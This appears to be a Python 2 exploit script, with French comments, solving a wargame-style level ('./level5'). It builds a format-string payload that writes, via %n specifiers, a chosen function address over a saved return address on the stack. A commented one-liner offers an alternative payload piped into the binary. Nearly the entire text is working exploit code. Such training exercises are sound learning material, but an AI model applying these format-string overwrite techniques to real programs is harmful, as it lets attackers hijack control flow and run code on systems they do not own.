import struct

eip = 0xbffff4dc # adresse eip dans printf
o = 0x080484a4

EIP0 = struct.pack("I", eip)
EIP1 = struct.pack("I", eip + 1)
EIP2 = struct.pack("I", eip + 2)
EIP3 = struct.pack("I", eip + 3)


#print "AAAAAAAAAAAAAAAAAAAAAAAAA" + "| %08x " * buffer_test #test to find buffer >> commence a la 4eme adresse


print EIP0 + "JUNK" + EIP1 + "JUNK" + EIP2 + "JUNK" + EIP3 + "%3$136x%4$n" + "%5$224x%6$n" + "%7$1664x%8$n" #+ "%9$1x%10$n"

#ou (python -c 'print "\xdc\xf4\xff\xbf%.134513824d%4$n"'; cat) | ./level5 #(134513824d = o - 4)